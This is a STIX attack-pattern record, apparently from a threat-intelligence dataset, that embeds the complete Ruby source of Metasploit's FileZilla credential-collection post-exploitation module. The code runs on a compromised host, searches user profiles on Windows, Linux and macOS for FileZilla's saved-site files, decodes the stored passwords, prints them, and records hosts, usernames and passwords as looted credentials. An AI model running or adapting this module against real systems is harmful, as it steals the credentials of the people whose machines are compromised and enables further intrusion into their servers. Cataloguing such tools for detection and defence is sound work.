{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec6759a6-c13d-4731-81b3-c520b33efe2c",
    "created": "2024-08-14T16:33:19.158623Z",
    "modified": "2024-08-14T16:33:19.158627Z",
    "name": "Multi Gather FileZilla FTP Client Credential Collection",
    "description": "This module will collect credentials from the FileZilla FTP client if it is installed. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/filezilla_client_cred.rb",
            "external_id": "filezilla_client_cred.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather FileZilla FTP Client Credential Collection',\n        'Description' => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bannedit', # post port, added support for shell sessions\n          'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script\n        ],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['shell', 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    paths = []\n    case session.platform\n    when 'unix', 'linux', 'bsd'\n      @platform = :unix\n      paths = enum_users_unix\n    when 'osx'\n      @platform = :osx\n      paths = enum_users_unix\n    when 'windows'\n      @platform = :windows\n      profiles = grab_user_profiles\n      profiles.each do |user|\n        next if user['AppData'].nil?\n\n        fzdir = check_filezilla(user['AppData'])\n        paths << fzdir if fzdir\n      end\n\n    else\n      print_error \"Unsupported platform #{session.platform}\"\n      return\n    end\n    if paths.nil? || paths.empty?\n      print_status('No users found with a FileZilla directory')\n      return\n    end\n\n    get_filezilla_creds(paths)\n  end\n\n  def enum_users_unix\n    if @platform == :osx\n      home = '/Users/'\n    else\n      home = '/home/'\n    end\n\n    if got_root?\n      userdirs = session.shell_command(\"ls #{home}\").gsub(/\\s/, \"\\n\")\n      userdirs << \"/root\\n\"\n    else\n      userdirs = session.shell_command(\"ls #{home}#{whoami}/.filezilla\")\n      if userdirs =~ /No such file/i\n        return\n      else\n        print_status(\"Found FileZilla Client profile for: #{whoami}\")\n        return [\"#{home}#{whoami}/.filezilla\"]\n      end\n    end\n\n    paths = Array.new\n    userdirs.each_line do |dir|\n      dir.chomp!\n      next if dir == '.' || dir == '..'\n\n      dir = \"#{home}#{dir}\" if dir !~ /root/\n      print_status(\"Checking for FileZilla Client profile in: #{dir}\")\n\n      stat = session.shell_command(\"ls #{dir}/.filezilla/sitemanager.xml\")\n      next if stat =~ /No such file/i\n\n      paths << \"#{dir}/.filezilla\"\n    end\n    return paths\n  end\n\n  def check_filezilla(filezilladir)\n    print_status(\"Checking for Filezilla directory in: #{filezilladir}\")\n    session.fs.dir.foreach(filezilladir) do |dir|\n      if dir =~ /FileZilla/\n        print_status(\"Found #{filezilladir}\\\\#{dir}\")\n        return \"#{filezilladir}\\\\#{dir}\"\n      end\n    end\n    return nil\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:username]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def get_filezilla_creds(paths)\n    sitedata = ''\n    recentdata = ''\n    creds = []\n\n    paths.each do |path|\n      print_status(\"Reading sitemanager.xml and recentservers.xml files from #{path}\")\n      if session.type == 'shell'\n        type = :shell\n        sites = session.shell_command(\"cat #{path}/sitemanager.xml\")\n        recents = session.shell_command(\"cat #{path}/recentservers.xml\")\n        print_status(\"recents: #{recents}\")\n        creds = [parse_accounts(sites)]\n        creds << parse_accounts(recents) unless recents =~ /No such file/i\n      else\n        type = :meterp\n        sitexml = \"#{path}\\\\sitemanager.xml\"\n        present = begin\n          session.fs.file.stat(sitexml)\n        rescue StandardError\n          nil\n        end\n        if present\n          sites = session.fs.file.new(sitexml, 'rb')\n          sitedata << sites.read until sites.eof?\n          sites.close\n          print_status('Parsing sitemanager.xml')\n          creds = [parse_accounts(sitedata)]\n        else\n          print_status('No saved connections where found')\n        end\n\n        recent_file = \"#{path}\\\\recentservers.xml\"\n        recent_present = begin\n          session.fs.file.stat(recent_file)\n        rescue StandardError\n          nil\n        end\n        if recent_present\n          recents = session.fs.file.new(recent_file, 'rb')\n          recentdata << recents.read until recents.eof?\n          recents.close\n          print_status('Parsing recentservers.xml')\n          creds << parse_accounts(recentdata)\n        else\n          print_status('No recent connections where found.')\n        end\n      end\n      creds.each do |cred|\n        cred.each do |loot|\n          if session.db_record\n            source_id = session.db_record.id\n          else\n            source_id = nil\n          end\n\n          report_cred(\n            ip: loot['host'],\n            port: loot['port'],\n            service_name: 'ftp',\n            username: loot['user'],\n            password: loot['password']\n          )\n        end\n      end\n    end\n  end\n\n  def parse_accounts(data)\n    creds = []\n\n    doc = begin\n      REXML::Document.new(data).root\n    rescue StandardError\n      nil\n    end\n    return [] if doc.nil?\n\n    doc.elements.to_a('//Server').each do |sub|\n      account = {}\n      account['host'] = begin\n        sub.elements['Host'].text\n      rescue StandardError\n        '<unknown>'\n      end\n      account['port'] = begin\n        sub.elements['Port'].text\n      rescue StandardError\n        '<unknown>'\n      end\n\n      case sub.elements['Logontype'].text\n      when '0'\n        account['logontype'] = 'Anonymous'\n      when /1|4/\n        account['user'] = begin\n          sub.elements['User'].text\n        rescue StandardError\n          '<unknown>'\n        end\n        if sub.elements['Pass'].attributes['encoding'] == 'base64'\n          account['password'] = begin\n            Rex::Text.decode_base64(sub.elements['Pass'].text)\n          rescue StandardError\n            '<unknown>'\n          end\n        else\n          account['password'] = begin\n            sub.elements['Pass'].text\n          rescue StandardError\n            '<unknown>'\n          end\n        end\n      when /2|3/\n        account['user'] = begin\n          sub.elements['User'].text\n        rescue StandardError\n          '<unknown>'\n        end\n        account['password'] = '<blank>'\n      end\n\n      if account['user'].nil?\n        account['user'] = '<blank>'\n      end\n      if account['password'].nil?\n        account['password'] = '<blank>'\n      end\n\n      case sub.elements['Protocol'].text\n      when '0'\n        account['protocol'] = 'FTP'\n      when '1'\n        account['protocol'] = 'SSH'\n      when '3'\n        account['protocol'] = 'FTPS'\n      when '4'\n        account['protocol'] = 'FTPES'\n      end\n      creds << account\n\n      print_status('    Collected the following credentials:')\n      print_status('    Server: %s:%s' % [account['host'], account['port']])\n      print_status('    Protocol: %s' % account['protocol'])\n      print_status('    Username: %s' % account['user'])\n      print_status('    Password: %s' % account['password'])\n      print_line('')\n    end\n    return creds\n  end\n\n  def got_root?\n    case @platform\n    when :windows\n      if session.sys.config.getuid =~ /SYSTEM/\n        return true\n      else\n        return false\n      end\n    else # unix, bsd, linux, osx\n      ret = whoami\n      if ret =~ /root/\n        return true\n      else\n        return false\n      end\n    end\n  end\n\n  def whoami\n    if @platform == :windows\n      session.sys.config.getenv('USERNAME')\n    else\n      session.shell_command('whoami').chomp\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}